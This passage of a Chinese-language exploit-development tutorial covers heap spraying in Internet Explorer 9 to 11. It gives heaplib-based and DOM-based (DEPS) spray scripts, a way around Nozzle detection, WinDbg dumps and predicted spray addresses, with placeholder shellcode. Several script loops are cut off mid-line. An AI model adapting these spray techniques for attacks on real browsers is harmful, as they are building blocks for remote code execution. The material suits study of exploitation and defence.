成功实现了精准堆喷射。  
**  
**
**Vista下的IE9的堆喷射**
IE8下的脚本在IE9下不再有用，因为IE9使用了Nozzle的防御措施，检测包含重复内容的内存申请，然后会阻止这样的申请，导致堆喷失败，由于我们的堆喷是精确的，所以前后的数据都不一定是滑板指令，可以是随机数，可以利用JavaScript的数学随机数生成随机串，绕过检测。
堆喷射脚本，同样需要包含heaplib.js:
    var heap_obj = new heapLib.ie(0x10000);
    var code = unescape("%u6174%u7367"); //tags
    for (var i=0; i 
首先堆喷是成功的:
    0:017> dd 0c0c0c0c
    0c0c0c0c  53885684 53885684 53885684 53885684
    0c0c0c1c  53885684 53885684 53885684 53885684
由于IE9中的堆喷用之前的方法查看不到堆的情况，所以我把code设为tags，堆喷完成后在内存中搜索tags:
    0:017> s -a 0x00000000 L?7fffffff "tags"
    00419b75  74 61 67 73 0a 2f 2f 76-61 72 20 72 6f 70 20 3d  tags.//var rop =
    01ff473f  74 61 67 73 20 28 61 74-74 72 69 62 75 74 65 73  tags (attributes
    0207c23c  74 61 67 73 2e 20 41 6c-73 6f 20 61 64 64 69 6e  tags. Also addin
    ...
    0396100c  74 61 67 73 92 39 90 17-92 39 90 17 92 39 90 17  tags.9...9...9..
    0396200c  74 61 67 73 92 39 90 17-92 39 90 17 92 39 90 17  tags.9...9...9..
    0396300c  74 61 67 73 92 39 90 17-92 39 90 17 92 39 90 17  tags.9...9...9..
    0396400c  74 61 67 73 92 39 90 17-92 39 90 17 92 39 90 17  tags.9...9...9..
    0396500c  74 61 67 73 92 39 90 17-92 39 90 17 92 39 90 17  tags.9...9...9..
    0396600c  74 61 67 73 92 39 90 17-92 39 90 17 92 39 90 17  tags.9...9...9..
    0396700c  74 61 67 73 92 39 90 17-92 39 90 17 92 39 90 17  tags.9...9...9..
    0396800c  74 61 67 73 92 39 90 17-92 39 90 17 92 39 90 17  tags.9...9...9..
    0396900c  74 61 67 73 92 39 90 17-92 39 90 17 92 39 90 17  tags.9...9...9..
    0396a00c  74 61 67 73 92 39 90 17-92 39 90 17 92 39 90 17  tags.9...9...9..
    ...
    ...
前面的是脚本在内存中的映射，看后面实际分配的内存，发现此时内存仍然是对齐的，按照0x1000对齐，计算得到偏移为0x5fe。  
精准堆喷脚本:
    var heap_obj = new heapLib.ie(0x10000);
    var code = unescape("%ucccc%ucccc"); 
    var rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444");
    var offset_length = 0x5fe;
    for (var i=0; i 
结果:
    0:022> dd 0c0c0c0c
    0c0c0c0c  41414141 42424242 43434343 44444444
    0c0c0c1c  cccccccc 57376654 57376654 57376654
另外前人总结了不同浏览器下堆喷射的尺寸:
    OS & Browser        Block syntax
    XP SP3 – IE7        block = shellcode.substring(2,0×10000-0×21);
    XP SP3 – IE8        block = shellcode.substring(2, 0×40000-0×21);
    Vista SP2 – IE7     block = shellcode.substring(0, (0×40000-6)/2);
    Vista SP2 – IE8     block = shellcode.substring(0, (0×40000-6)/2);
    Win7 – IE8          block = shellcode.substring(0, (0×80000-6)/2);
**Win8下的IE10和IE11的堆喷射**
IE9下的脚本在IE10和IE11中不再适用，IE10和IE11中无法再使用传统的BSTR字符串的方法，而要使用一种称为DEPS的技术，这种技术使用html的标签来进行堆喷射，具体就是创建大量的DOM对象，在对象的某一个属性中填入相应的字符串，这一技术的发明者给出了测试脚本:
        var div_container = document.getElementById("blah");
        div_container.style.cssText = "display:none";
        var data;
        offset = 0x104;
        junk = unescape("%u2020%u2020");
        while (junk.length 
这个脚本先创建了一个div标签，然后加入了大量的button元素，将每个button元素的title设置为要喷射的字符串。  
由于win8下现在默认安装的是IE11，而且IE10和IE11差不多，这里用IE11做实验，注意这里不再使用经典的0x0c0c0c0c作为预测地址，而是使用0x20302228作为预测地址，这也算是前人研究的结果。
win8下的IE11:
    0:016> dd 20302228
    20302228  41414141 42424242 43434343 44444444
    20302238  cccccccc 20202020 20202020 20202020
    20302248  20202020 20202020 20202020 20202020
对于火狐使用地址是0x20202210或0x20302210，对于IE8、IE9、IE10使用地址为0x20302228或0x20202228。  
XP下的IE8:
    0:021> dd 0x20302228
    20302228  41414141 42424242 43434343 44444444
    20302238  cccccccc 20202020 20202020 20202020
    20302248  20202020 20202020 20202020 20202020
Vista下的IE9:
    0:022> dd 0x20302228
    20302228  41414141 42424242 43434343 44444444
    20302238  cccccccc 20202020 20202020 20202020
    20302248  20202020 20202020 20202020 20202020
这次的堆喷射脚本可能比之前喷射要慢一些。  
**  
**
**总结**
除了以上的方法，还有HTML5 Spray、ActionScript Spray、Array Object Heap Spraying、JIT
Spray等方法进行堆喷射和绕过浏览器的安全机制，当然现在大部分系统都变成了64位，在64位下的堆喷射由于地址空间过大，所以堆喷射没有什么意义，但在小范围仍有用处。